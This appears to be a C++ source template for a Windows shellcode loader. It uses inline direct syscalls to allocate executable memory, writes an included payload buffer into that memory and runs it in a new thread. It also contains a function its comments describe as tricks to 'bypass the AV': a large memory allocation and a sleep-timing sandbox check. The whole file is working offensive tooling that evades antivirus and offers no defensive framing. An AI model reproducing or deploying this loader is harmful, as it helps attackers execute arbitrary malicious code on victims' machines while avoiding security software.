// Author: Abdul Azeez Omar
// File: temp.cc
// Purpose: This is the template file for the EXE file construction it contains the implementation of invoking all the system calls.

#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <iostream>
#include <stdio.h>
// This header contains the initialization function.
// If you already initialized, inline_syscall.hpp contains all you need.
#include "./src/inline_syscall/include/in_memory_init.hpp"
//typedef struct _INITIAL_TEB PINITIAL_TEB;
NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
// declares the header of all the functions needed
NTSTATUS NtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten);


NTSTATUS NtCreateThreadEx(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

NTSTATUS NtWaitForSingleObject(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout
);

#include "ld.c"

int byp(){ // this function is add some tricks to bypass the AV
char * Memdmp = NULL;
Memdmp = (char *)malloc(100000000);
if (Memdmp != NULL) {
  memset(Memdmp, 00, 100000000);
  free(Memdmp);
}
 int Tick = GetTickCount();
  Sleep(10000);
  int Tac = GetTickCount();
  if ((Tac - Tick) < 10000) {
    return false;
  }
  return true;
}
int main(int argc, char** argv) {
    jm::init_syscalls_list();
    void* allocation = nullptr;
    NTSTATUS status = STATUS_PENDING;
    HANDLE hThread = (void *)-1;
    SIZE_T size=sizeof(buf);
    printf("[*] Allocating %d bytes for buf\n",size);
    status = INLINE_SYSCALL(NtAllocateVirtualMemory)( //triggers a syscall to virtual alloc
        (HANDLE)-1,
        &allocation,
        0,
        &size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
        );

    if (status || !allocation) {
        printf("allocate failed\n");
        return -1;
    }
    printf("[+] Allocation success\n");
    unsigned long long bytesWritten;
    status = INLINE_SYSCALL(NtWriteVirtualMemory)( // then it copies the shellcode's bytes to the allocated memory
        (HANDLE)-1,
        allocation,
        buf,
        size,
        &bytesWritten);

    if (status) {
	printf("write failed\n");
        return -1;
    }
    printf("[+] buf written successfully %d bytes\n",bytesWritten);


    status = INLINE_SYSCALL(NtCreateThreadEx)(  // then it triggers a new remote process with the shellcode copied before
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,
        (HANDLE)-1,
        allocation,
        allocation,
        0,
        0,
        0,
        0,
        nullptr);
    
    if (status) {
	printf("create thread failed\n");
        return -1;
    }
    printf("[+] Thread created successfully\n");
    status = INLINE_SYSCALL(NtWaitForSingleObject)(hThread, TRUE, NULL);  // then it waits for an object
    unsigned long exitcode;
    GetExitCodeThread(hThread,&exitcode);
    printf("%d",exitcode);
    if (status) {
	printf("wait failed\n");
        return -1;
    }
    
    printf("[+] Finished.\n");
    return 0;
}
